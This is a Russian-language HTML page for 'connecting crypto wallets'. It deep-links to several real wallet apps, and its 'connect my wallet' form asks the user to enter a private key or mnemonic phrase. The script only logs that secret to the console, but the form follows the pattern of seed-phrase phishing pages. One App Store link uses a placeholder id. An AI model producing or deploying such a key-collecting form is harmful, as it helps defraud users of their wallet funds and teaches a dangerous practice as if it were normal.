<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подключение кошельков</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .wallet-form { margin-top: 20px; display: none; }
        .wallet-form input { width: 100%; padding: 10px; margin-bottom: 10px; }
        .wallet-form button { padding: 10px; background: #4a90e2; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Подключение криптокошельков</h1>
    <button onclick="connectWallet('phantom')">Подключить Phantom</button>
    <button onclick="connectWallet('solflare')">Подключить Solflare</button>
    <button onclick="connectWallet('trust')">Подключить Trust Wallet</button>
    <button onclick="connectWallet('coinbase')">Подключить Coinbase Wallet</button>
    <button onclick="connectWallet('safepal')">Подключить SafePal</button>
    <button onclick="connectWallet('backpack')">Подключить Backpack</button>
    <button onclick="connectWallet('okx')">Подключить OKX Wallet</button>
    <button onclick="connectWallet('exodus')">Подключить Exodus</button>
    <button onclick="showCustomWalletForm()">Подключить мой кошелек</button>

    <div class="wallet-form" id="customWalletForm">
        <input type="text" id="walletInput" placeholder="Введите приватный ключ или мнемоническую фразу">
        <button onclick="connectCustomWallet()">Подключить</button>
    </div>

    <script>
        const wallets = {
            phantom: {
                deeplink: 'phantom://',
                universal: 'https://phantom.app/',
                appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
                playStore: 'https://play.google.com/store/apps/details?id=app.phantom'
            },
            solflare: {
                deeplink: 'solflare://',
                universal: 'https://solflare.com/',
                appStore: 'https://apps.apple.com/app/solflare/id1568374995',
                playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
            },
            trust: {
                deeplink: 'trust://',
                universal: 'https://link.trustwallet.com/',
                appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
                playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
            },
            coinbase: {
                deeplink: 'cbwallet://',
                universal: 'https://go.cb-w.com/',
                appStore: 'https://apps.apple.com/app/coinbase-wallet-store-crypto/id1278383455',
                playStore: 'https://play.google.com/store/apps/details?id=org.toshi'
            },
            safepal: {
                deeplink: 'safepal://',
                universal: 'https://www.safepal.io/',
                appStore: 'https://apps.apple.com/app/safepal-wallet/id1548297139',
                playStore: 'https://play.google.com/store/apps/details?id=io.safepal.wallet'
            },
            backpack: {
                deeplink: 'backpack://',
                universal: 'https://backpack.app/',
                appStore: 'https://apps.apple.com/app/backpack/id1234567890',
                playStore: 'https://play.google.com/store/apps/details?id=com.backpack'
            },
            okx: {
                deeplink: 'okx://',
                universal: 'https://www.okx.com/',
                appStore: 'https://apps.apple.com/app/okx/id1327268470',
                playStore: 'https://play.google.com/store/apps/details?id=com.okinc.okex'
            },
            exodus: {
                deeplink: 'exodus://',
                universal: 'https://www.exodus.com/',
                appStore: 'https://apps.apple.com/app/exodus-crypto-wallet/id1414384820',
                playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus'
            }
        };

        function connectWallet(walletName) {
            const wallet = wallets[walletName];
            if (!wallet) {
                alert('Кошелек не поддерживается!');
                return;
            }

            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
            const isAndroid = /Android/.test(navigator.userAgent);

            window.location.href = wallet.deeplink;

            setTimeout(() => {
                if (document.hidden) return;

                if (isIOS) {
                    window.location.href = wallet.appStore;
                } else if (isAndroid) {
                    window.location.href = wallet.playStore;
                } else {
                    window.location.href = wallet.universal;
                }
            }, 1000);
        }

        function showCustomWalletForm() {
            document.getElementById('customWalletForm').style.display = 'block';
        }

        function connectCustomWallet() {
            const walletInput = document.getElementById('walletInput').value;
            if (!walletInput) {
                alert('Пожалуйста, введите данные кошелька!');
                return;
            }

            alert('Подключение пользовательского кошелька...');
            console.log('Пользовательский кошелек:', walletInput);
        }
    </script>
</body>
</html>
